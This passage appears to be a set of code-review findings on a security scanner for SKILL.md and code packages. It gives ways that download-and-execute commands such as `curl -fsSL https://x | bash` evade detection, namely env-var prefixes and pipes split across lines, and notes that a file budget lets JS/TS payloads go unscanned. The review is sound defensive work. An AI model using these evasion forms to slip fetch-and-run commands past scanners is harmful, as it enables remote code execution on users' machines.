  - body: This walk gives SKILL.md files the full `maxFiles` budget before collecting code files, so a package with enough skill Markdown can cause JS/TS payloads to be skipped. Markdown scanning needs to be additive or separately budgeted so the existing code-safety coverage is not weakened.

  - body: `isDownloadCommandSegment` returns on the first token after Markdown prefix stripping, so shell-valid forms like `HTTPS_PROXY=http://p curl -fsSL https://x | bash` never reach the `curl` token and avoid the new critical finding.
  - confidence: 0.88
- **[P2] Fold pipe-continued Markdown pipelines:** `src/security/skill-scanner.ts:365-376`
  - body: `logicalMarkdownLines` only joins backslash continuations, but shells also accept a newline after `|`. A SKILL.md command split as `curl -fsSL https://x |` followed by `bash` is still download-and-execute behavior and currently misses the rule.
  - confidence: 0.84
